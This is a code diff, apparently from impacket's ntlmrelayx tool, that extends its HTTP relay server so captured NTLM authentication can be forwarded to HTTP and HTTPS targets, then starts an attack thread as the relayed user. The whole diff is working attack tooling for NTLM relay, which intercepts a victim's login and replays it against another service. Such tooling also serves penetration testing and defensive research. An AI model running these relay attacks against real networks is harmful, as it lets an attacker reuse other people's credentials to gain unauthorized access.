@@ -24,7 +24,7 @@ import string
 from threading import Thread
 
 from impacket import ntlm
-from impacket.examples.ntlmrelayx.clients import SMBRelayClient, MSSQLRelayClient, LDAPRelayClient
+from impacket.examples.ntlmrelayx.clients import SMBRelayClient, MSSQLRelayClient, LDAPRelayClient, HTTPRelayClient
 from impacket.spnego import SPNEGO_NegTokenResp
 from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
 from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
@@ -193,20 +193,20 @@ class HTTPRelayServer(Thread):
                     logging.error("Connection against target %s FAILED" % self.target[1])
                     logging.error(str(e))
 
+            if self.target[0] == 'HTTP' or self.target[0] == 'HTTPS':
+                try:
+                    self.client = HTTPRelayClient("%s://%s:%d/%s" % (self.target[0].lower(),self.target[1],self.target[2],self.target[3]))
+                    clientChallengeMessage = self.client.sendNegotiate(token)
+                except Exception, e:
+                    logging.error("Connection against target %s FAILED" % self.target[1])
+                    logging.error(str(e))
+
             #Calculate auth
             self.challengeMessage = ntlm.NTLMAuthChallenge()
             self.challengeMessage.fromString(clientChallengeMessage)
-            #self.challengeMessage['flags'] ^= ntlm.NTLMSSP_NEGOTIATE_TARGET_INFO
             self.do_AUTHHEAD(message = 'NTLM '+base64.b64encode(self.challengeMessage.getData()))
         
         def do_ntlm_auth(self,token,authenticateMessage):
-            #print 'Returned challenge response:'
-            #print repr(token)
-            
-            #Assuming we are authing against a domain controller
-            #authenticateMessage['flags'] |= ntlm.NTLMSSP_TARGET_TYPE_DOMAIN
-            #print repr(authenticateMessage['flags'])
-
             #For some attacks it is important to know the authenticated username, so we store it
             self.authUser = authenticateMessage['user_name']
             
@@ -217,7 +217,6 @@ class HTTPRelayServer(Thread):
                 if self.target[0] == 'SMB':
                     clientResponse, errorCode = self.client.sendAuth(respToken2.getData(),self.challengeMessage['challenge'])
                 if self.target[0] == 'MSSQL':
-                    #This client needs a proper response code
                     try:
                         result = self.client.sendAuth(token)
                         return result #This contains a boolean
@@ -227,7 +226,6 @@ class HTTPRelayServer(Thread):
                         return False
 
                 if self.target[0] == 'LDAP' or self.target[0] == 'LDAPS':
-                    #This client needs a proper response code
                     try:
                         result = self.client.sendAuth(token) #Result dict
                         if result['result'] == 0 and result['description'] == 'success':
@@ -240,6 +238,19 @@ class HTTPRelayServer(Thread):
                         #{'dn': u'', 'saslCreds': None, 'referrals': None, 'description': 'invalidCredentials', 'result': 49, 'message': u'8009030C: LdapErr: DSID-0C0905FE, comment: AcceptSecurityContext error, data 52e, v23f0\x00', 'type': 'bindResponse'}
                         #Ok example:
                         #{'dn': u'', 'saslCreds': None, 'referrals': None, 'description': 'success', 'result': 0, 'message': u'', 'type': 'bindResponse'}
+                    except Exception, e:
+                        logging.error("NTLM Message type 3 against %s FAILED" % self.target[1])
+                        logging.error(str(e))
+                        return False
+
+                if self.target[0] == 'HTTP' or self.target[0] == 'HTTPS':
+                    try:
+                        result = self.client.sendAuth(token) #Result is a boolean
+                        if result:
+                            return True
+                        else:
+                            logging.error("HTTP NTLM auth against %s as %s FAILED" % (self.target[1],self.authUser))
+                            return False
                     except Exception, e:
                         logging.error("NTLM Message type 3 against %s FAILED" % self.target[1])
                         logging.error(str(e))
@@ -259,7 +270,10 @@ class HTTPRelayServer(Thread):
                 clientThread.start()
             if self.target[0] == 'LDAP' or self.target[0] == 'LDAPS':
                 clientThread = self.server.config.attacks['LDAP'](self.server.config, self.client, self.authUser)
-                clientThread.start()                
+                clientThread.start()
+            if self.target[0] == 'HTTP' or self.target[0] == 'HTTPS':
+                clientThread = self.server.config.attacks['HTTP'](self.server.config, self.client, self.authUser)
+                clientThread.start()
 
     def __init__(self, config):
         Thread.__init__(self)
